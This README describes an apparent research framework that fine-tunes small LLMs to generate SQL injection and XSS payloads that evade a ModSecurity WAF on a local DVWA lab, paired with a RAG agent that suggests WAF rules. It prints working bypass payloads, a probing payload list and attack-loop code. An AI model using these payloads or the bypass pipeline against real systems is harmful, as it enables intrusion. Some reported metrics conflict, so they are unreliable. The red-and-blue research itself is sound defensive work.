# LLM4WAF: Hệ Thống Red & Blue Teaming Tự Động Cho Web Application Firewalls

Dự án này triển khai một framework khép kín (end-to-end) cho **Tấn công Đối kháng (Red Team)** và **Tinh chỉnh Phòng thủ Thông minh (Blue Team)** sử dụng các Mô hình Ngôn ngữ Lớn (LLMs).

## 🚀 Tổng Quan Dự Án

Mục tiêu là tự động hóa quy trình tìm kiếm lỗ hổng (bypass WAF) và vá chúng:

1.  **Red Agent (Tấn công):** Sử dụng Học tăng cường (Reinforcement Learning - RL) để sinh ra các payload SQL Injection (SQLi) và XSS tinh vi nhằm vượt qua WAF.
2.  **Blue Agent (Phòng thủ):** Phân tích các cuộc tấn công thành công bằng RAG (Retrieval-Augmented Generation) và cơ sở tri thức OWASP Core Rule Set (CRS) để đề xuất cấu hình WAF chính xác.

---

## 🚀 Quick Start Guide

### 1️⃣ Setup Environment

```bash
# Clone repo
git clone <repo_url>
cd LLM_in_Cyber

# Create virtual environment
python -m venv .venv
source .venv/bin/activate  # Linux/WSL
# .venv\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt
```

### 2️⃣ Start WAF Environment

```bash
# Basic WAF (ModSecurity + DVWA)
docker-compose up -d

# Multi-WAF testing
docker-compose -f docker-compose.multiwaf.yml up -d
```

### 3️⃣ Train Red Agent

**Phase 1 - Basic SFT:**

```bash
python scripts/train_red.py --config configs/red_gemma2_2b_lora_v2.yaml
```

**Phase 2 - Reasoning:**

```bash
python scripts/train_red.py --config configs/phase2_gemma2_2b_reasoning.yaml
```

**Phase 3 - Lightweight Enhanced:**

```bash
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_gemma.yaml
```

**Phase 4 - RL Training:**

```bash
python scripts/train_rl_adaptive_pipeline.py --config configs/gemma2_2b_phase3_rl.yaml
```

### 4️⃣ Evaluate Models

```bash
# Test against WAF
python scripts/test_training_payloads_strict_waf.py

# Compare checkpoints
python scripts/test_rl_checkpoint.py

# Analyze RL metrics
python scripts/analyze_rl_metrics.py
```

### 5️⃣ Run Blue Agent

```bash
# Build knowledge base
python blue/rag_index.py

# Analyze attacks
python blue/runner_phase2_eval.py

# Generate WAF rules
python blue/runner_phase3_suggest.py
```

---

## 📚 Dataset Building Scripts

Để tái tạo hoặc tùy chỉnh datasets:

```bash
# Phase 1: Combine and balance dataset
python scripts/build_phase1_phase2_combined_dataset.py

# Phase 2: Build reasoning dataset with CoT
python scripts/build_phase2_dataset.py

# Phase 3: Build lightweight optimized dataset
python scripts/build_phase3_lightweight.py
```

---

## 🔴 RED Agent Pipeline (Đội Tấn Công)

Red Agent tiến hóa từ một bộ sinh payload cơ bản thành một công cụ né tránh thông minh qua 4 giai đoạn.

### Phase 1: Supervised Fine-Tuning (SFT) - Học Cú Pháp Cơ Bản

**🎯 Mục tiêu:** Dạy model nắm vững cú pháp SQLi/XSS và các kỹ thuật bypass WAF cơ bản.

**📊 Dataset:**

- **File:** `data/processed/phase1_passed_only_39k.jsonl` (39,155 mẫu)
- **Script build:** `scripts/build_phase1_phase2_combined_dataset.py`
- **Nội dung:** Payload đã bypass thành công WAF, cân bằng giữa các kỹ thuật
- **Format:** `{"instruction": "...", "input": "...", "output": "<payload>"}`

**🛠️ Scripts Training:**

```bash
# Training Phase 1
python scripts/train_red.py --config configs/red_gemma2_2b_lora_v2.yaml
```

**📈 Kết quả (Benchmark 20 Diverse Cases - Local WAF):**

- **Gemma 2 2B:** 50% bypass rate
- **Phi-3 Mini:** 70% bypass rate
- **Qwen 7B:** 80% bypass rate (cao nhất)

**💾 Checkpoints:**

- `experiments/gemma2_2b_v40_subsample_5k/checkpoint-314/`
- `experiments/phi3_mini_v40_subsample_5k/checkpoint-314/`

---

### Phase 2: Reasoning SFT (Chain-of-Thought) - Học Suy Luận

**🎯 Mục tiêu:** Dạy model _suy nghĩ_ về cách bypass thông qua reasoning traces (CoT).

**📊 Dataset:**

- **File:** `data/processed/red_phase2_reasoning_combined.jsonl` (~5k mẫu)
- **Script build:** `scripts/build_phase2_dataset.py`
- **Nội dung:** Bộ ba [Context WAF → Reasoning → Payload mới]
- **Format:** Có trường `reasoning` giải thích tại sao payload được chọn

**🛠️ Scripts Training:**

```bash
# Training Phase 2
python scripts/train_red.py --config configs/phase2_gemma2_2b_reasoning.yaml
python scripts/train_red.py --config configs/phase2_phi3_mini_reasoning.yaml
```

**📈 Kết quả (Benchmark với Structured Prompt):**

- **Gemma 2 2B:** 65% bypass rate (+15% vs Phase 1)
- **Phi-3 Mini:** 85% bypass rate (+15% vs Phase 1, chất lượng cao nhất)
- **Qwen 7B:** 55% bypass rate (có hiện tượng over-thinking)

**💾 Checkpoints:**

- `experiments/phase2_gemma2_2b_reasoning/checkpoint-314/`
- `experiments/phase2_phi3_mini_reasoning/checkpoint-94/`

**⚠️ Critical:** Yêu cầu structured prompt với `Context`, `Payload History`, `Target Technique`

---

### Phase 3: Lightweight SFT - Tối Ưu Hiệu Suất

**🎯 Mục tiêu:** Balance giữa quality và training time, tập trung vào các kỹ thuật bypass hiệu quả.

**📊 Dataset:**

- **File:** `data/processed/red_phase3_lightweight.jsonl` (5,001 mẫu)
- **Script build:** `scripts/build_phase3_lightweight.py`
- **Nội dung:** Lọc kỹ thuật hiệu quả + augmentation thông minh
- **Đặc điểm:**
  - Loại bỏ các payload hallucination/không hợp lệ
  - Tăng cường balanced sampling theo kỹ thuật
  - Coverage 38 kỹ thuật bypass khác nhau

**🛠️ Scripts Training:**

```bash
# Training Phase 3 Enhanced (Multi-GPU)
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_gemma.yaml
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_phi3.yaml
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_qwen3b.yaml
```

**📈 Kết quả:**

- **Training metrics:**
  - Gemma 2 2B: 626 steps, final loss ~0.15
  - Phi-3 Mini: 626 steps, final loss ~0.12
  - Qwen 3B: 314 steps, final loss ~0.18
- **Evaluation:** Chưa chạy benchmark đầy đủ

**💾 Checkpoints:**

- `experiments/red_phase3_lightweight_enhanced_gemma/checkpoint-314/`
- `experiments/red_phase3_lightweight_enhanced_phi3/checkpoint-626/`
- `experiments/red_phase3_lightweight_enhanced_qwen3b/checkpoint-314/`

---

### Phase 4: Reinforcement Learning (RL-PPO) - Tự Động Khám Phá

**🎯 Mục tiêu:** Tối ưu hóa khả năng bypass thông qua tương tác thực tế với WAF (trial-and-error).

**📊 Dataset:**

- **Base model:** Phase 3 checkpoint
- **Environment:** `rl/waf_env.py` - WAF interaction environment
- **Reward:** Binary (+1 bypass, -1 blocked) với baseline normalization

**🛠️ Scripts Training:**

```bash
# RL Training với PPO
python scripts/train_rl_adaptive_pipeline.py --config configs/gemma2_2b_phase3_rl.yaml
```

**📈 Kết quả (50 epochs):**

- **Gemma 2 2B RL:**
  - Baseline reward: -0.046 → +0.180 (+0.226 improvement)
  - First half avg: 0.006, Second half avg: 0.102 (+96% improvement)
  - Bypass rate: ~70% (smoke test on local WAF)
  - **Status:** ✅ Training completed, model improving but not fully converged

**💾 Checkpoints:**

- `experiments/gemma2_2b_phase3_rl/checkpoint-50/` (latest)
- Training logs: `training.log`, `training_metrics.csv`

**📊 Analysis Scripts:**

```bash
# Analyze RL convergence
python scripts/analyze_rl_metrics.py

# Visualize metrics
python scripts/plot_rl_metrics.py

# Test RL checkpoint
python scripts/test_rl_checkpoint.py
```

**🎯 Next Steps:**

- Continue training 50-100 more epochs để stabilize
- Evaluate on diverse WAF configurations
- Compare với Phase 3 base model

---

## 💡 Demo: Sample Prompts Từng Phase

### Phase 1: Basic SFT - Simple Prompt

```
Instruction: Generate a SQL injection payload to bypass ModSecurity WAF.
Target: User input parameter 'id' in URL query string.
Technique: Tautology-based SQLi

Output: ' OR 1=1 --
```

**Đặc điểm:**

- Prompt đơn giản, direct
- Model chỉ cần biết cú pháp
- Không cần context hay history

---

### Phase 2: Reasoning SFT - Structured Prompt

```
Context:
- Target WAF: ModSecurity + OWASP CRS 3.3 (Paranoia Level 1)
- Attack Type: SQL Injection
- Injection Point: GET parameter 'id'
- WAF Filters: SQL keywords (SELECT, UNION, OR), comment syntax (--, #)

Payload History:
1. ' OR 1=1 -- → BLOCKED (SQL keywords detected)
2. ' OR '1'='1 → BLOCKED (Tautology pattern detected)

Target Technique: Comment Obfuscation

Reasoning:
The WAF blocks standard SQL keywords and comment syntax. To bypass:
1. Use inline comments /**/ to break up keywords
2. Avoid obvious patterns like 1=1
3. URL encode special characters

Generated Payload: 1/**/OR/**/1=1
```

**Đặc điểm:**

- Yêu cầu Context, History, Target Technique
- Model phải **suy luận** tại sao payload trước bị block
- Output bao gồm Reasoning + Payload
- **Critical:** Thiếu structured prompt → performance giảm 20% → 85%

---

### Phase 3: Lightweight - Optimized Structured Prompt

```
Context:
- WAF: ModSecurity CRS 4.0 (PL1)
- Target: SQLi in 'username' POST parameter
- Known Blocks: SQL keywords, comment syntax, UNION

Payload History (Last 3 attempts):
1. admin' OR 1=1-- → BLOCKED (keyword OR)
2. admin'||'1 → BLOCKED (concatenation pattern)
3. admin'/**/OR/**/'1 → BLOCKED (comment obfuscation detected)

Target Technique: Double URL Encoding

Analysis:
- Direct keywords blocked even with comments
- WAF decodes URL once but not twice
- Need to encode special chars twice

Payload: admin%2527%2520OR%25201%253D1--
```

**Đặc điểm:**

- Tương tự Phase 2 nhưng dataset chất lượng cao hơn
- Focus vào kỹ thuật hiệu quả (38 techniques)
- Loại bỏ hallucination/invalid payloads

---

### Phase 4: RL - Interactive Learning

**Không có prompt cố định!** Model học qua **trial-and-error**:

```python
# RL Environment Interaction
for episode in range(50):
    # 1. Model generate payload
    payload = model.generate(state)

    # 2. Send to WAF
    response = waf.test(payload)

    # 3. Calculate reward
    if response.blocked:
        reward = -1
    else:
        reward = +1

    # 4. Update policy
    model.update_policy(reward)
```

**Reward Signal:**

- `+1`: Payload bypass WAF successfully
- `-1`: Payload blocked by WAF
- **Baseline normalization:** Reward - running_average

**Kết quả sau 50 epochs:**

- Baseline: -0.046 → +0.180 (+0.226 improvement)
- Model tự khám phá techniques chưa được dạy trong SFT
- Bypass rate: 70% (tăng từ 65% Phase 2)

---

## 🎯 Demo: Attack Pipeline Workflow

Script `run_attack_pipeline.py` minh họa quy trình tấn công thực tế:

### Workflow

```
┌─────────────────────────────────────────────────┐
│  Phase 1: Probing (Thăm dò WAF)                │
├─────────────────────────────────────────────────┤
│  1. Login to DVWA                               │
│  2. Send 10 diverse probing payloads            │
│  3. Record which PASSED/BLOCKED                 │
│                                                  │
│  Example Results:                               │
│  ✓ ' OR 1=1 --           → BLOCKED             │
│  ✓ 1/**/OR/**/1=1        → PASSED              │
│  ✓ <script>alert(1)      → BLOCKED             │
│  ✓ %3Cscript%3E          → PASSED              │
└─────────────────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────────┐
│  Phase 2: Adaptive Generation (LLM)            │
├─────────────────────────────────────────────────┤
│  1. Load trained model + adapter                │
│  2. Build prompt with probing history           │
│  3. LLM analyzes patterns:                      │
│     - What techniques PASSED?                   │
│     - Why were others BLOCKED?                  │
│  4. Generate NEW adaptive payload               │
│                                                  │
│  Example Prompt:                                │
│  "Based on history, /**/ comments bypassed.     │
│   Generate a UNION injection with comments."    │
│                                                  │
│  Generated: 1/**/UNION/**/SELECT/**/1,version() │
└─────────────────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────────┐
│  Phase 3: Verification                          │
├─────────────────────────────────────────────────┤
│  1. Send generated payload to WAF               │
│  2. Check result (PASSED/BLOCKED)               │
│  3. Log outcome                                 │
│                                                  │
│  Result: PASSED ✓                               │
│  (Successfully bypassed WAF and executed SQLi)  │
└─────────────────────────────────────────────────┘
```

### Usage Example

```bash
# 1. Start DVWA + WAF
docker-compose up -d

# 2. Run attack pipeline
python scripts/run_attack_pipeline.py

# Expected Output:
# [2025-12-07 10:00:00] Logging into http://localhost:8000...
# [2025-12-07 10:00:01] Login successful.
# [2025-12-07 10:00:02] Loading model: microsoft/Phi-3-mini-4k-instruct
# [2025-12-07 10:00:15] Model loaded.
# [2025-12-07 10:00:15] --- Phase 1: Probing WAF ---
# [2025-12-07 10:00:16] Probe: ' OR 1=1 --... -> BLOCKED
# [2025-12-07 10:00:17] Probe: 1/**/OR/**/1=1... -> PASSED
# [2025-12-07 10:00:18] Probe: <script>alert(1)... -> BLOCKED
# ... (10 probes total)
# [2025-12-07 10:00:25] --- Phase 2: Adaptive Attack ---
# [2025-12-07 10:00:30] Generated Payload: 1/**/UNION/**/SELECT/**/1,version()
# [2025-12-07 10:00:31] Attack Result: PASSED
```

### Key Components

**1. Probing Payloads (Diverse Techniques):**

```python
PROBING_PAYLOADS = [
    {"payload": "' OR 1=1 --", "technique": "Tautology"},
    {"payload": "1/**/OR/**/1=1", "technique": "Comment Obfuscation"},
    {"payload": "<script>alert(1)</script>", "technique": "Basic XSS"},
    {"payload": "%27%20OR%20%271%27%3D%271", "technique": "Double URL Encode"},
    # ... 6 more techniques
]
```

**2. Adaptive Prompt Building:**

```python
# Format history
history_str = ""
for h in probe_history:
    history_str += f"Payload: `{h['payload']}` -> {h['result']}\n"

# Build prompt
prompt = f"""
Context: ModSecurity + OWASP CRS PL1
Probing History:
{history_str}

Task: Analyze patterns and generate NEW adaptive payload.
"""
```

**3. Model Inference:**

```python
# Load model with 4-bit quantization
model = AutoModelForCausalLM.from_pretrained(
    "microsoft/Phi-3-mini-4k-instruct",
    quantization_config=bnb_4bit_config
)
model = PeftModel.from_pretrained(model, adapter_path)

# Generate
outputs = model.generate(**inputs, max_new_tokens=128, temperature=0.7)
payload = tokenizer.decode(outputs[0], skip_special_tokens=True)
```

**4. WAF Testing:**

```python
def _send_payload(payload):
    r = httpx.get(SQLI_URL, params={"id": payload})
    if r.status_code == 403:
        return False  # WAF blocked
    return True  # Bypassed
```

---

## 🔵 BLUE Agent Pipeline (Đội Phòng Thủ)

Blue Agent đóng vai trò là một Chuyên gia An ninh AI để tinh chỉnh WAF dựa trên dữ liệu từ Red Team.

### Phase 1: Chuẩn Bị Dữ Liệu & Knowledge Base

**Mục tiêu:** Chuẩn bị dữ liệu cho AI Analyst.

- **Đầu vào:** Log tấn công từ Red Team (format JSONL).
- **Quy trình:**
  1.  **Episodes:** Chuyển đổi log thô thành "Episodes" có cấu trúc (Attack + WAF Response + App Response).
  2.  **Knowledge Base:** Index tài liệu OWASP CRS (regex rules, tags) vào vector store.
- **Lệnh chạy:**

  ```bash
  # Build Episodes
  python scripts/blue_build_phase1_episodes.py

  # Build Knowledge Base
  python scripts/blue_build_crs_kb.py
  ```

- **Dữ liệu đầu ra:**
  - `data/blue/blue_phase1_episodes.jsonl`
  - `data/blue/blue_phase1_crs_kb.jsonl`

### Phase 2: RAG Analysis & Evaluation

**Mục tiêu:** Truy xuất các rule liên quan và kiểm chứng khả năng phân tích của AI trên tập Golden Set.

- **Đầu vào:** `data/blue/blue_phase1_golden.jsonl` (Các case đã được xác minh).
- **Lệnh chạy:**
  ```bash
  python blue/runner_phase2_eval.py
  ```
- **Đầu ra:** `data/blue/blue_phase2_eval_summary.txt` (Báo cáo độ chính xác phân tích).

### Phase 3: Recommendation Generation (Tạo Đề Xuất)

**Mục tiêu:** Sinh ra các thay đổi cấu hình cụ thể (Bản vá).

- **Đầu vào:** `data/blue/blue_phase1_episodes.jsonl` + RAG Knowledge Base.
- **Quy trình:** Blue LLM (Sử dụng Gemma 2 Base Model để đảm bảo format JSON chuẩn) phân tích từng cuộc tấn công thành công và đề xuất rule WAF cụ thể.
- **Lệnh chạy:**
  ```bash
  python blue/runner_phase3_suggest.py
  ```
- **Đầu ra:** `data/blue/blue_phase3_suggestions.jsonl` (Danh sách JSON các rule được đề xuất).

### Phase 4: WAF Overlay & Evaluation (Áp Dụng & Đánh Giá)

**Mục tiêu:** Áp dụng bản vá và kiểm tra hiệu quả.

- **Quy trình:**
  1.  **Generate Config:** Chuyển đổi JSON suggestions thành file config WAF thực tế (`.conf`, `.yaml`).
  2.  **Re-Eval:** Khởi động lại WAF với config mới và cho Red Team tấn công lại.
- **Lệnh chạy:**

  ```bash
  # 1. Tạo file cấu hình WAF
  python blue/phase3_generate_waf_overlays.py

  # 2. Khởi động môi trường Multi-WAF
  docker-compose -f docker-compose.multiwaf.yml up -d --build

  # 3. Chạy đánh giá Red Team (Kiểm tra lại khả năng bypass)
  python scripts/run_red_eval_profile.py --config configs/eval_phase3_multiwaf_gemma2.yaml
  ```

- **Đầu ra:**
  - `waf/blue_modsecurity_suggestions.conf`: File chứa rule WAF mới sinh ra.
  - `eval/red_phase4_overall_summary.json`: Báo cáo so sánh hiệu quả (Base WAF vs. Blue Tuned WAF).

---

## 📊 Tổng Kết Kết Quả Thực Nghiệm

### Red Agent Performance Summary

| Phase                     | Model      | Dataset Size | Training Steps | Bypass Rate | Key Improvement          |
| ------------------------- | ---------- | ------------ | -------------- | ----------- | ------------------------ |
| **Phase 1 (SFT Basic)**   | Gemma 2 2B | 39,155       | 314            | 50%         | Baseline cú pháp         |
|                           | Phi-3 Mini | 39,155       | 314            | 70%         | Tốt hơn Gemma            |
|                           | Qwen 7B    | 5,000        | -              | 80%         | Cao nhất P1              |
| **Phase 2 (Reasoning)**   | Gemma 2 2B | ~5,000       | 314            | 65%         | +15% vs P1               |
|                           | Phi-3 Mini | ~5,000       | 94             | **85%**     | +15%, quality cao nhất   |
|                           | Qwen 7B    | ~5,000       | -              | 55%         | Over-thinking issue      |
| **Phase 3 (Lightweight)** | Gemma 2 2B | 5,001        | 314/626        | Chưa eval   | Optimized dataset        |
|                           | Phi-3 Mini | 5,001        | 626            | Chưa eval   | Training loss 0.12       |
|                           | Qwen 3B    | 5,001        | 314            | Chưa eval   | Training loss 0.18       |
| **Phase 4 (RL-PPO)**      | Gemma 2 2B | RL env       | 50 epochs      | 70%         | +5% from P2, tự khám phá |

### Key Findings

#### 1. Prompt Sensitivity (Critical Discovery)

- **Phase 1:** Ít nhạy prompt, hoạt động ổn với simple prompts
- **Phase 2/3:** **YÊU CẦU BUỘC** structured prompt:
  ```
  Context: <WAF config>
  Payload History: <previous attempts>
  Target Technique: <SQLi/XSS technique>
  ```
- **Impact:**
  - Simple prompt: Phase 2 ~20%, Phase 3 ~10%
  - Structured prompt: Phase 2 **~85%**, Phase 3 **~90%**

#### 2. Model Size vs Quality

- **Small models (2-3B):**
  - ✅ Fast training/inference
  - ✅ Reasonable performance with good prompts
  - ❌ Context overload với RAG dài
- **Medium models (7B+):**
  - ✅ Better context handling
  - ✅ Less hallucination
  - ❌ Có thể over-think (Qwen case)

#### 3. RL Training Convergence

- **Observations:**
  - Baseline improvement: -0.046 → +0.180 (+226%)
  - Learning curve: First half 0.006 → Second half 0.102
  - **Status:** Model improving nhưng chưa fully converged
  - **Recommendation:** Cần 50-100 epochs thêm

#### 4. Dataset Quality Impact

- Phase 3 Lightweight (5k mẫu chất lượng) > Phase 1 (39k mẫu mixed quality)
- Balanced sampling theo kỹ thuật quan trọng hơn số lượng
- Filtering hallucination/invalid payloads cải thiện đáng kể

### Blue Agent Results

| Phase       | Task            | Input            | Output                         | Status         |
| ----------- | --------------- | ---------------- | ------------------------------ | -------------- |
| **Phase 1** | Episodes + KB   | Red attack logs  | Structured episodes + OWASP KB | ✅ Complete    |
| **Phase 2** | RAG Analysis    | Golden set       | Analysis accuracy report       | ✅ Evaluated   |
| **Phase 3** | Rule Generation | Episodes + RAG   | WAF rule suggestions (JSON)    | ✅ Generated   |
| **Phase 4** | WAF Overlay     | Blue suggestions | `.conf` files + re-eval        | ⏳ In progress |

### Benchmark Environment

**WAF Configuration:**

- Engine: ModSecurity 3.x
- Ruleset: OWASP CRS v4.0
- Paranoia Levels tested: PL1 (default), PL4 (strict)

**Test Cases:**

- 20 diverse SQLi/XSS techniques
- Target: DVWA (Damn Vulnerable Web Application)
- Metric: Bypass rate (% payloads vượt qua WAF)

**Hardware:**

- Training: NVIDIA RTX 4060 Laptop (8GB VRAM)
- Inference: Same + CPU fallback
- RL Training: Local WAF environment (Docker)

---

## 📂 Cấu Trúc Dự Án

```
LLM_in_Cyber/
├── 📁 blue/                    # Blue Agent (Defense)
│   ├── llm_client.py          # LLM API client
│   ├── prompts.py             # Prompt templates
│   ├── rag_retriever.py       # RAG retrieval logic
│   └── runner_phase*.py       # Evaluation runners
│
├── 📁 red/                     # Red Agent (Attack)
│   ├── red_rag_integration.py # RAG integration
│   └── rag_internal_client.py # Internal RAG client
│
├── 📁 configs/                 # Training/Eval configs
│   ├── red_gemma2_2b_lora_v2.yaml          # Phase 1 training
│   ├── phase2_*_reasoning.yaml             # Phase 2 CoT training
│   ├── red_phase3_lightweight_enhanced_*.yaml  # Phase 3 training
│   ├── gemma2_2b_phase3_rl.yaml           # Phase 4 RL training
│   └── phase3_*_v38_*.yaml                # Evaluation configs
│
├── 📁 data/                    # Datasets
│   ├── processed/
│   │   ├── phase1_passed_only_39k.jsonl         # Phase 1: SFT (39k PASSED only)
│   │   ├── phase1_balanced_10k.jsonl            # Phase 1: Stratified 10k (509 techniques)
│   │   ├── phase2_with_replay_22k.jsonl         # Phase 2: Adaptive with replay (20k + 2k)
│   │   ├── phase2_observations_20k.jsonl        # Phase 2: Old observations (deprecated)
│   │   └── phase2_observations_10k.jsonl        # Phase 2: Old subset (deprecated)
│   └── blue/
│       ├── blue_phase1_episodes.jsonl
│       └── blue_phase1_crs_kb.jsonl
│
├── 📁 scripts/                 # Utilities
│   ├── 🔨 build_phase1_phase2_combined_dataset.py  # Build Phase 1 data
│   ├── 🔨 build_phase2_dataset.py                  # Build Phase 2 CoT data
│   ├── 🔨 build_phase3_lightweight.py              # Build Phase 3 data
│   ├── 🎓 train_red.py                            # Main training script
│   ├── 🎓 train_rl_adaptive_pipeline.py           # RL training (Phase 4)
│   ├── 🧪 test_rl_checkpoint.py                   # Test RL models
│   ├── 🧪 test_training_payloads_strict_waf.py    # Evaluate on WAF
│   ├── 📊 analyze_rl_metrics.py                   # Analyze RL convergence
│   ├── 📊 plot_rl_metrics.py                      # Visualize training
│   └── 📊 generate_report_charts.py               # Generate reports
│
├── 📁 experiments/             # Trained models
│   ├── gemma2_2b_v40_subsample_5k/              # Phase 1
│   ├── phase2_*_reasoning/                       # Phase 2
│   ├── red_phase3_lightweight_enhanced_*/        # Phase 3
│   └── gemma2_2b_phase3_rl/                     # Phase 4 RL
│       ├── checkpoint-10/ ... checkpoint-50/
│       ├── training.log
│       └── training_metrics.csv
│
├── 📁 rl/                      # RL Environment
│   └── waf_env.py             # WAF interaction environment
│
├── 📁 waf/                     # WAF configurations
│   ├── modsecurity_crs.conf   # Base ModSecurity rules
│   └── blue_overlay_*.conf    # Blue Agent generated rules
│
├── 📁 docs/                    # Documentation
│   ├── RL_TRAINING_GUIDE.md   # RL training guide
│   └── blue_phase1_schema.md  # Blue Agent schema
│
├── 🐳 docker-compose.yml      # Base WAF environment
├── 🐳 docker-compose.multiwaf.yml  # Multi-WAF testing
└── 📄 README.md               # This file
```

### Key Directories:

- **`data/processed/`**: Tất cả datasets đã được xử lý, sẵn sàng training
- **`experiments/`**: Model checkpoints từ tất cả các phase
- **`scripts/`**: Build data, training, testing, analysis tools
- **`configs/`**: YAML configs cho mỗi experiment

---

## 🤝 Thực hiện

- **HAD** - Lead Developer / AI Security Researcher

---

## 🐛 Known Issues / Troubleshooting

### 1. CUDA Out of Memory (OOM) on 8GB GPUs for Gemma 2B Training

- **Vấn đề:** Khi fine-tune Gemma 2 2B (kể cả với QLoRA 4-bit), GPU 8GB (ví dụ RTX 3050, 3060, 4060) thường gặp lỗi `CUDA Out of Memory` (`torch.OutOfMemoryError`). Điều này xảy ra ngay cả khi `per_device_train_batch_size` đã giảm xuống 1 và `gradient_accumulation_steps` đã tăng.
- **Nguyên nhân:** Model Gemma 2 2B, dù là 2 tỷ tham số, nhưng có kiến trúc phức tạp và `max_seq_length` lớn (đặc biệt cần cho RAG context) đòi hỏi lượng VRAM đáng kể. Cấu hình mặc định (ví dụ `max_seq_length=1024`) quá lớn đối với 8GB VRAM.
- **Giải pháp được đề xuất:**
  - **Tốt nhất:** Sử dụng GPU có VRAM từ **16GB trở lên** (ví dụ: RTX 3090/4090, A10G, A5000/6000).
  - **Tạm thời (nếu chỉ có 8GB VRAM):**
    - Giảm `max_seq_length` trong file config (`configs/red_phase2_rag_sft.yaml`) xuống **512 hoặc thậm chí 256**. Tuy nhiên, điều này sẽ làm giảm đáng kể lượng RAG context mà model có thể xử lý, ảnh hưởng đến hiệu quả của RAG.
    - Đảm bảo `per_device_train_batch_size` là `1` và `gradient_accumulation_steps` được tăng lên để giữ `effective_batch_size` hợp lý.
    - Thử tắt `bnb_4bit_use_double_quant` trong `BitsAndBytesConfig` (mặc dù script `train_red.py` đã đọc từ config file, cần thêm tùy chọn này vào config file nếu muốn điều chỉnh).
- **Liên quan đến RAG:** RAG-SFT rất cần `max_seq_length` đủ lớn để chứa RAG context. Việc giảm `max_seq_length` xuống quá thấp sẽ làm giảm hiệu quả của việc fine-tune RAG-SFT.

---

## ⚠️ Critical Findings Regarding RED Agent Performance

Trong quá trình đánh giá (Evaluation) các model RED Agent (Phase 1, 2, 3), đã phát hiện ra một yếu tố cực kỳ quan trọng ảnh hưởng đến hiệu năng:

1.  **Prompt Sensitivity (Độ nhạy với Prompt):**

    - **Phase 1 (SFT):** Model này ít nhạy cảm với format prompt. Nó có thể hoạt động tốt (~55% bypass rate) với các prompt đơn giản (e.g., "Generate payload for...").
    - **Phase 2 (Reasoning) & Phase 3 (RL):** Hai model này **YÊU CẦU BẮT BUỘC** phải sử dụng đúng format prompt mà chúng được huấn luyện (bao gồm các trường `Context`, `Payload History`, `Target Technique`).
    - **Thực nghiệm:**
      - Sử dụng prompt đơn giản: Phase 2 đạt ~20%, Phase 3 đạt ~10%.
      - Sử dụng prompt chuẩn (structured): Phase 2 đạt **~85%**, Phase 3 đạt **~90%**.

2.  **Model Size & RAG Compliance (Phân tích chuyên sâu):**

    - Ban đầu có thể lầm tưởng các model nhỏ như Gemma 2B ít tuân thủ context RAG. Tuy nhiên, các nghiên cứu gần đây (ví dụ: Ghosh et al., EMNLP 2024, Farahani & Johansson, EMNLP 2024 - tham khảo `evidence.txt`) cho thấy **cả Small (như Phi) lẫn Large LLM đều có xu hướng "dựa vào context nhiều hơn parametric" khi context có liên quan.**
    - Vấn đề thực sự của Small Model không phải là "không muốn" tuân thủ, mà là **thiếu năng lực xử lý** để đọc, lọc nhiễu, xử lý mâu thuẫn giữa context và parametric knowledge, và tuân thủ các instruction phức tạp trong một context RAG dài. Chúng dễ bị "overloaded" và sinh ra output kém chất lượng.
    - Do đó, việc huấn luyện RAG-SFT (Phase 2.5) là để **tăng cường khả năng xử lý context hiệu quả** cho model, dạy nó cách tích hợp thông tin RAG vào payload một cách chính xác, đúng cú pháp và tuân thủ các ràng buộc.

3.  **Kết luận:**
    - Khi tích hợp model Phase 2/3 vào hệ thống khác (ví dụ: RAG), **PHẢI** đảm bảo xây dựng prompt đúng cấu trúc như trong `scripts/build_phase2_dataset.py`.
    - Việc performance thấp đột ngột thường do "Prompt Mismatch" hoặc "Context Overload" chứ không phải do model bị lỗi hay cố tình bỏ qua RAG.
